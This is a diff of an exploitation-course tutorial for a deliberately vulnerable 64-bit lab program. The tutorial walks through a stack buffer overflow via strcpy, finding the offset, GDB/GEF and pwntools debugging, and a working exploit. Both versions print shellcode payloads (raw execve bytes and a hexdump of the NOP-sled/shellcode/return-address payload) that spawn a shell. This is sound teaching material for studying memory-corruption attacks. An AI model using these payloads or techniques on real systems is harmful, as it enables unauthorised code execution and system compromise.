@@ -2,243 +2,291 @@
 
 ## Introduction
 
-We will create a functional exploit for a 64 bit program with a stack overflow vulnerability. This includes
-finding the vulnerability, get all necessary information for our exploit, and create a sample exploit as
-python program.
+We will create a functional exploit for a 64 bit program with a stack overflow vulnerability
+using pwntools. 
 
 
 ## Goal
 
-* Implement a fully working exploit for x64 bit architecture with GDB and simple tools
-* Write the same exploit again, but with pwntools
-
-The following exploits are available: 
-* [challenge12-exploit-skel.py](https://github.com/dobin/yookiterm-challenges-files/blob/master/challenge12/challenge12-exploit-skel.py): a prepared exploit, missing offset and address
-* [challenge12-exploit-gdb.py](https://github.com/dobin/yookiterm-challenges-files/blob/master/challenge12/challenge12-exploit-gdb.py): skel with data used in this writeup. Which may work
-*  [challenge12-exploit-pwn.py](https://github.com/dobin/yookiterm-challenges-files/blob/master/challenge12/challenge12-exploit-pwn.py): pwntools exploit
+* Implement a fully working exploit for x64 bit
+* Learn about pwntools
+* Learn about GEF
 
 
 ## Challenge Source
 
-This is the same as challenge11, but in 64 bit.
+* Source directory: `~/challenges/challenge12/`
+* Source files: [challenge12](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge12)
 
 You can compile it by calling `make` in the folder `~/challenges/challenge12`
 
-Analysis:
-```
-root@hlUbuntu64:~/challenges/challenge12# file challenge12
-challenge12: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9397ca5655aeb327386bb0d572717f9906978301, not stripped
-```
+The source is similar to challenge10. Same vulnerability, but different input vector.
 
 
 ## Vulnerability
 
-Source: [challenge12.c](https://github.com/dobin/yookiterm-challenges-files/blob/master/challenge12/challenge12.c)
-
-Reminder: the vulnerability lies here:
+Reminder: the vulnerability lies in the function `handleData()`:
 
 ```c
 void handleData(char *username, char *password) {
-	...
-	char firstname[64];
-	...
-	strcpy(firstname, username);
-	...
+    int isAdmin = 0;
+    char name[128];
+    ...
+    strcpy(name, username);
+    ...
 }
 
 int main(int argc, char **argv) {
+    char username[1024];
 	...
-	handleData(argv[1], argv[2]);
+	printf("Username: "); fflush(stdout);
+    read(0, username, sizeof(username));
+
+    printf("Password: "); fflush(stdout);
+    read(0, password, sizeof(password));
+
+    handleData(username, password);
 }
 ```
 
-The first command line argument of the program is copied into a stack buffer of 64 byte size.
-
-
-## Find offset
-
-You can crash the program by giving longer and longer strings as first argument.
-
-Depending on the amount of overflow, one of these conditions can appear:
-- Not enough overflow: Program exits cleanly, `isAdmin` is 0x0
-- Nearly enough overflow: Program exists cleanly, `isAdmin` is overflowed (has 0x41's)
-- Overflow into SBP: Program crashes, but with `RIP` = 0x400833 or similar (no 0x41's)
-- Overflow into SIP: Program crashes, with `RIP` = 0x0000004141 (what we want)
-- Overflow too far into `SIP`: Program crashes, with `RIP` = 0x4007d3 or similar (again no 0x41's)
-
-### Nearly enough overflow
-
-Offset: 70
+What has been changed is that the arguments in the previous challenges, are now read from the keyboard. 
 
 ```
-(gdb) run `python -c 'print "A" * 70 + "BBBB"'` test
-You are admin!
-isAdmin: 0x4242
-[Inferior 1 (process 504) exited normally]
+~/challenges/challenge12$ ./challenge12 
+Username: Test
+Password: password123
+Not admin.
 ```
 
-### Overflow into SBP
 
-Offset: 78
+## Pwntools
 
-```
-(gdb) run `python -c 'print "A" * 78 + "BBBB"'` test
-You are admin!
-isAdmin: 0x42424141
+From now on we will use the [pwntools library](https://docs.pwntools.com/en/stable/) to write our exploits. 
+For this challenge, it will make it easier to interact with the vulnerable program.
 
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000000400832 in main ()
-```
+The exploit would look someting like this:
+```python
+from pwn import *
 
-### Overflow into SIP
+io = process("./challenge12")
 
-Offset: 86
+exploit = b'A' * 128
 
-```
-(gdb) run `python -c 'print "A" * 86 + "BBBB"'` test
-You are admin!
-isAdmin: 0x41414141
+io.sendafter(b"Username: ", exploit)
+io.sendafter(b"Password: ", b'password')
 
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000000004242 in ?? ()
+print(str(io.read()))
 ```
 
-Offset: 88
+`io=process()` will create a process, and `io.sendafter("A", "B")` will wait for "A" to appear
+from the program on stdout, and write "B" into stdin.
+
+It will generate the following output:
 ```
-(gdb) run `python -c 'print "A" * 88 + "BBBB"'` test
-You are admin!
-isAdmin: 0x41414141
-
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000042424242 in ?? ()
-```
-
-`0x0000000042424242` is exactly "BBBB" - no byte too much or too little.
-Therefore, offset is 88 bytes.
-
-
-### Overflow too far into SIP
-
-Offset: 92
-
-```
-(gdb) run `python -c 'print "A" * 92 + "BBBB"'` test
-You are admin!
-isAdmin: 0x41414141
-
-Program received signal SIGSEGV, Segmentation fault.
-0x00000000004007d3 in handleData ()
+[+] Starting local process './challenge12': pid 1085697
+b'Not admin.\n'
+[*] Stopped process './challenge12' (pid 1085697)
 ```
 
-We have completely overwritten SIP here, all 64 bits. This is not a valid address, therefore
-RIP is now `0x00000000004007d3`. Very confusing.
 
+## Pwntools debugging and GEF
 
-## Find buffer base address
-
-We want to identify the buffer address of the variable `name` in the function `handleData()`,
-as there will be our shellcode be located.
-
-For this, we set a breakpoint exactly before `strcpy(name, username)` gets executed.
-The register RDI contains the first parameter for `strcpy()`, and therefore points
-to our variable / buffer / shellcode.
-
-We take care to be as realistic as possible, and give a input buffer of the same size
-as the actual exploit: offset 84 + 8 byte SIP.
-
-
-Disassemble the main function:
-```
-gdb-peda$ disas handleData
-Dump of assembler code for function handleData:
-...
-   0x00000000004007db <+60>:    mov    rdx,QWORD PTR [rbp-0x58]
-   0x00000000004007df <+64>:    lea    rax,[rbp-0x50]
-   0x00000000004007e3 <+68>:    mov    rsi,rdx
-   0x00000000004007e6 <+71>:    mov    rdi,rax
-=> 0x00000000004007e9 <+74>:    call   0x4005e0 <strcpy@plt>
-...
-```
-
-Lets break before calling `strcpy()`:
-```
-gdb-peda$ b *handleData+74
-Breakpoint 1 at 0x400783
-```
-
-And run it with some dummy data:
-
-```
-gdb-peda$ run `python -c 'print "A" * 88 + "BBBB"'` test
-Starting program: /root/challenges/challenge12/challenge12 AAAAAAAA BBBBBBBB
-
-Breakpoint 1, 0x0000000000400828 in main ()
-```
-
-Lets check the buffer where `strcpy()` copies the argument. It is in RDI.
-
-```
-gdb-peda$ i r rdi
-rdi            0x7fffffffe560   0x7fffffffe560
-gdb-peda$ x/32x $rdi
-0x7fffffffe560: 0x58    0x58    0x58    0x58    0x58    0x58    0x58   0x58
-0x7fffffffe568: 0x58    0x58    0x58    0x58    0x58    0x58    0x58   0x58
-0x7fffffffe570: 0x58    0x58    0x58    0x58    0x58    0x58    0x58   0x58
-0x7fffffffe578: 0x58    0x58    0x58    0x58    0x58    0x58    0x58   0x58
-```
-
-Therefore, the start of the buffer, where our future shellcode will be, is `0x7fffffffe560`.
-
-
-## Create an exploit
-
-The prepared exploit skeleton is available at the file `challenge12-exploit-skel.py`.
-Lets insert the correct values:
+We can automatically start GDB when executing the exploit, attached to the process. 
+This makes exploit development much easier. We need to combine it with something like
+`io.poll()` at the end of the script, so that the script does not exit when we are
+still using GDB:
 
 ```python
-#!/usr/bin/python
-# Skeleton exploit for challenge12
-import sys
-import struct
-
-shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
-
-buf_size = 64
-
-offset = 88 # Offset we found
-ret_addr = struct.pack('<Q', 0x7fffffffe560) # Memory address we found
-
-# fill up to 64 bytes
-exploit = "\x90" * (buf_size - len(shellcode))
-exploit += shellcode
-
-# garbage between buffer and RET
-exploit += "A" * (offset - len(exploit))
-
-# add ret
-exploit += ret_addr
-
-# print to stdout
-sys.stdout.write(exploit)
+gdb.attach(io, 'continue')
+...
+io.poll(block=True)
 ```
 
-And try it:
+Tmux will be used to show the output of GDB, in the lower half of the terminal. 
+Lets configure the exploit to overflow with `exploit = b'A' * 156`.
+It will give something like this as output
+```
+~/challenges/challenge12$ python3 challenge12-exploit.py
+[+] Starting local process './challenge12': pid 315
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './challenge12', '315', '-x', '/tmp/pwn9lxo2ph7.gdb']
+[+] Waiting for debugger: Done
+b'You are admin!\n'
 
-```sh
-(gdb) run `python ./challenge12-exploit-gdb.py` bbbb
-Starting program: /root/challenges/challenge12/challenge12 `python ./challenge12-exploit-gdb.py` bbbb
+
+───────────────────────────────────────────────────────────────────────────────────────────────
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0xf
+$rbx   : 0x0
+$rcx   : 0x007ffff7eb2f33  →  0x5577fffff0003d48 ("H="?)
+$rdx   : 0x0
+$rsp   : 0x007fffffffe7c0  →  0x007fffffffece8  →  0x007fffffffeed9  →  "./challenge12"
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x000000004052a0  →  "You are admin!\n"
+$rdi   : 0x007ffff7f85670  →  0x0000000000000000
+$rip   : 0x41414141
+────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x41414141
+────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "challenge12", stopped 0x41414141 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────
+gef➤
+```
+
+GDB is now using GEF, to provide helpful tools when writing exploits. It will also show information
+like the content of registers on every breakpoint.
+
+GDB debugging the program has been executed in the lower tmux window. It crashed with `RIP=0x41414141`. 
+You can look around by using GDB commands. Once you are finished, exit gdb with `ctrl-d` or just `quit`. 
+
+
+## Notes on finding the offset for 64 bit
+
+RIP on x64 bit cannot be fully utilized - the top most bytes have to be zero. 
+
+This means that if you overflow too much, RIP will be set to some kind of "default" value. It will
+look like this, using `offset=160`:
+
+```
+~/challenges/challenge12$ python3 challenge12-exploit.py
+[+] Starting local process './challenge12': pid 476
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './challenge12', '476', '-x', '/tmp/pwnof4d7j52.gdb']
+[+] Waiting for debugger: Done
+b'You are admin!\n'
+
+────────────────────────────────────────────────────────────────────────────────────────────────────
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0xf
+$rbx   : 0x0
+$rcx   : 0x007ffff7eb2f33  →  0x5577fffff0003d48 ("H="?)
+$rdx   : 0x0
+$rsp   : 0x007fffffffe7b8  →  "AAAAAAAA"
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x000000004052a0  →  "You are admin!\n"
+$rdi   : 0x007ffff7f85670  →  0x0000000000000000
+$rip   : 0x00000000401265  →  <handleData+109> ret
+─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x401264 <handleData+108> leave
+ →   0x401265 <handleData+109> ret
+[!] Cannot disassemble from $PC
+─────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "challenge12", stopped 0x401265 in handleData (), reason: SIGSEGV
+────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤
+```
+
+While RIP is not set to 0x4141414141, it crashed on the `ret` instruction: A good indicator we 
+overflowed too much. 
+
+
+## Writing the exploit
+
+As before, you require three different things: 
+* The offset to RIP
+* The shellcode
+* The location of the shellcode in memory
+
+Use `challenge12-exploit.py` as basis for your exploit. And the knowledge of challenge11 to gather this information, and update the exploit accordingly. 
+
+* Update the exploit so you can reliably crash the vulnerable program (should be prepared like this)
+* Make sure you have the right offset to SIP
+* Replace the `exploit` variable with the real exploit as in challenge11 (NOPs, shellcode, garbage, SIP)
+* Find the address of the exploit in memory
+* See if the exploit executed `/bin/dash`
+* If yes, disable debug commands in the exploit, and enjoy your fresh shell
+
+Use the following shellcode: 
+```
+context.arch='amd64'
+shellcode = asm(shellcraft.amd64.sh())
+```
+
+Some tipps:
+* `gdb.attach(io, 'continue')` the second argument are GDB commands. Remove the `continue` to interact with GDB on startup. Or add breakpoints like `b *handleData+75`
+* You can re-use the exploit pattern function `make()` from `challenge11-exploit.py`
+* Use the shellcode in variable `main():username`, NOT `handleData():name` as SIP. The later will sadly not work!
+* Use `io.interactive()` instead of `io.poll()` once the shellcode gets executed reliably.
+
+If you have trouble, peek at `challenge12-solution.py`.
+
+
+## Solution
+
+```
+~/challenges/challenge12$ python3 ./challenge12-solution.py
+[+] Starting local process './challenge12': pid 1227
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './challenge12', '1227', '-x', '/tmp/pwn5jo4gg_r.gdb']
+[+] Waiting for debugger: Done
+Sending exploit:
+00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000010  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000020  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000030  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000040  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000050  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
+00000060  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
+00000070  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
+00000080  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000090  41 41 41 41  41 41 41 41  f0 e7 ff ff  ff 7f        │AAAA│AAAA│····│··│
+0000009e
+[*] Switching to interactive mode
 You are admin!
-isAdmin: 0x41414141
-process 364 is executing new program: /bin/dash
-# id
-uid=0(root) gid=0(root) groups=0(root)
+$
+────────────────────────────────────────────────────────────────────────────────────────────────────
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0xfffffffffffffe00
+$rbx   : 0x0
+$rcx   : 0x007ffff7eb2e8e  →  0x5a77fffff0003d48 ("H="?)
+$rdx   : 0x400
+$rsp   : 0x007fffffffe7b8  →  0x0000000040131c  →  <main+193> mov edi, 0x4020be
+$rbp   : 0x007fffffffebf0  →  0x00000000401380  →  <__libc_csu_init+0> push r15
+$rsi   : 0x007fffffffe7f0  →  0x0000000000000000
+$rdi   : 0x0
+$rip   : 0x007ffff7eb2e8e  →  0x5a77fffff0003d48 ("H="?)
+─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7eb2e8c <read+12>        syscall
+ → 0x7ffff7eb2e8e <read+14>        cmp    rax, 0xfffffffffffff000
+   0x7ffff7eb2e94 <read+20>        ja     0x7ffff7eb2ef0 <__GI___libc_read+112>
+   0x7ffff7eb2e96 <read+22>        ret
+   0x7ffff7eb2e97 <read+23>        nop    WORD PTR [rax+rax*1+0x0]
+─────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "challenge12", stopped 0x7ffff7eb2e8e in __GI___libc_read (), reason: STOPPED
+────────────────────────────────────────────────────────────────────────────────────────────────────
+process 1227 is executing new program: /usr/bin/dash
 ```
 
-We see that "/bin/dash" is being executed, and a shell prompt "#" is displayed. This means
-that our exploit works!
+Pressint `ctrl-c` and then `ctrl-d` will exit GDB, and you can interact with the shell on
+the main script (at `$ `).
 
 
-## Questions
+To make it easier, just add `NOPTRACE` argument. This will disable `gdb.attach()`:
+```
+~/challenges/challenge12$ python3 ./challenge12-solution.py NOPTRACE
+[+] Starting local process './challenge12': pid 1253
+[!] Skipping debug attach since context.noptrace==True
+Sending exploit:
+00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000010  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000020  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000030  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000040  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000050  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
+00000060  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
+00000070  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
+00000080  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000090  41 41 41 41  41 41 41 41  f0 e7 ff ff  ff 7f        │AAAA│AAAA│····│··│
+0000009e
+[*] Switching to interactive mode
+You are admin!
+$ ls
+Makefile     challenge12-exploit.py   challenge12.c
+challenge12  challenge12-solution.py
+```
 
-* Can you adjust the exploit so it works without GDB?
-* Can you create an exploit which works in both, with and without GDB?
+
+## Things to think about
+
+* If you use the shellcode in `handleData():name`, does it work? Why not?
